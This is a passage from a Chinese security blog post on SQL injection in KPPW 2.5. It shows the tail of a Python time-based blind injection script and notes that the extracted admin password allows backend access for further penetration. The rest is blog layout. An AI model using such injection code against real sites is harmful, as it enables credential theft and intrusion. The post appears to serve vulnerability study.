        if time.time()-starttime&gt;5:#获取接收服务器响应的时间，如果存在延时，说明查询到了内容，将结果输出
            data=data+chr(j)
            print data
            break
</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180111/kDhKfiEFHi.PNG" alt="mark"><br><strong>以上是KPPW2.5的两个注入点，还有很多注入点，注入手法和漏洞都大差不易</strong></p>
<p><strong>通过注入出的网站管理员密码，可以进入后台，进行下一步渗透</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180111/H38eHf86fm.PNG" alt="mark"></p>
<h3 id="本文用到的实验代码"><a href="#本文用到的实验代码" class="headerlink" title="本文用到的实验代码"></a>本文用到的实验代码</h3><p><strong>KPPW2.5源码</strong></p>
<pre><code>链接：https://pan.baidu.com/s/1eTPzBBc 密码：xdr6
</code></pre>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/LuFei.jpg"
                alt="Lawliet" />
            
              <p class="site-author-name" itemprop="name">Lawliet</p>
              <p class="site-description motion-element" itemprop="description">信息安全技术博客</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">26</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">9</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">13</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          <div class="links-of-author motion-element">
            
          </div>

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.shentoushi.top/index" title="渗透测试师导航" target="_blank">渗透测试师导航</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.lorexxar.cn/" title="LoRexxar's Blog" target="_blank">LoRexxar's Blog</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.leavesongs.com/" title="离别歌" target="_blank">离别歌</a>
                  </li>
                
              </ul>
            </div>
          
          

        </div>
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=443078&auto=0&height=66"></iframe>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Lawliet</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.3</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>



  


  




	





  





  












  





  

  

  
  

  

  

  

</body>
</html>
